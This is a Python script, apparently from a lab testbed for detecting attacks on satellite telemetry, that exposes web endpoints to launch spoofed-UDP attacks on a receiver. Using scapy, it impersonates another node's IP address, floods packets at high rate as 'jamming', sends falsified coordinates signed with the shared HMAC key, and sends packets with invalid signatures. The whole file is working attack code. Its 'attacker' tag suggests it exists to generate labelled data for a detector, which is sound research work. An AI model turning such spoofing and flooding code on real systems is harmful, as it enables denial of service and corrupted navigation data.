import threading
import time
import json
import hmac
import hashlib
import random
from datetime import datetime
from fastapi import FastAPI
import uvicorn
from scapy.all import IP, UDP, Raw, send

#config 
TARGET_IP = "10.0.1.12"  #m2nin dis agdaki ip adresi
SPOOFED_IP = "10.0.0.11" #m2, m1'in ip adresini taklit ediyor
UDP_PORT = 5005
SECRET_KEY = b"bkzs_secret_key_2026"

app = FastAPI()

attack_flags = {
    "jamming": False,
    "manipulation": False,
    "invalid_sig": False
}

def stop_all_attacks():
    #yeni saldiri baslamadan onceki saldiri temizleniyor
    for key in attack_flags:
        attack_flags[key] = False
    time.sleep(0.2) 

def create_fake_packet(lat_offset=0.0, lon_offset=0.0, wrong_signature=False):
    data = {
        "id": "SAT-ISS-01",
        "timestamp": datetime.now().isoformat(),
        "lat": 39.9334 + lat_offset,
        "lon": 32.8597 + lon_offset,
        "alt": 420.0,
        "velocity_km_s": 7.66,
        "rssi": round(random.uniform(-44.0, -40.0), 2), #hacker'in dalgali sinyali
        "attacker": True #etiketleme icin gizli imza
    }
    
    json_data = json.dumps(data, sort_keys=True)
    
    if wrong_signature:
        data["signature"] = "b4df00d_invalid_hash_xyz_123"
    else:
        data["signature"] = hmac.new(SECRET_KEY, json_data.encode(), hashlib.sha256).hexdigest()
        
    return json.dumps(data).encode()

def jamming_loop():
    print(">>> Jamming/DDoS Başladı")
    while attack_flags["jamming"]:
        payload = create_fake_packet()
        pkt = IP(src=SPOOFED_IP, dst=TARGET_IP)/UDP(sport=5005, dport=UDP_PORT)/Raw(load=payload)
        send(pkt, verbose=False)
        time.sleep(0.01) #cok hizli frekans

def manipulation_loop():
    print(">>> Manipülasyon Başladı (Doğru İmza)")
    while attack_flags["manipulation"]:
        payload = create_fake_packet(lat_offset=5.5, lon_offset=2.1)
        pkt = IP(src=SPOOFED_IP, dst=TARGET_IP)/UDP(sport=5005, dport=UDP_PORT)/Raw(load=payload)
        send(pkt, verbose=False)
        time.sleep(2) #normal frekans

def invalid_sig_loop():
    print(">>> Geçersiz İmza Saldırısı Başladı")
    while attack_flags["invalid_sig"]:
        payload = create_fake_packet(wrong_signature=True)
        pkt = IP(src=SPOOFED_IP, dst=TARGET_IP)/UDP(sport=5005, dport=UDP_PORT)/Raw(load=payload)
        send(pkt, verbose=False)
        time.sleep(1)

#api endpointleri

@app.post("/attack/jamming/start")
def start_jamming():
    stop_all_attacks()
    attack_flags["jamming"] = True
    threading.Thread(target=jamming_loop, daemon=True).start()
    return {"status": "Jamming Started"}

@app.post("/attack/manipulation/start")
def start_manipulation():
    stop_all_attacks()
    attack_flags["manipulation"] = True
    threading.Thread(target=manipulation_loop, daemon=True).start()
    return {"status": "Manipulation Started"}

@app.post("/attack/invalid_sig/start")
def start_invalid_sig():
    stop_all_attacks()
    attack_flags["invalid_sig"] = True
    threading.Thread(target=invalid_sig_loop, daemon=True).start()
    return {"status": "Invalid Signature Attack Started"}

@app.post("/attack/stop")
def stop_attacks():
    stop_all_attacks()
    print(">>> Tüm saldırılar durduruldu.")
    return {"status": "All attacks stopped"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)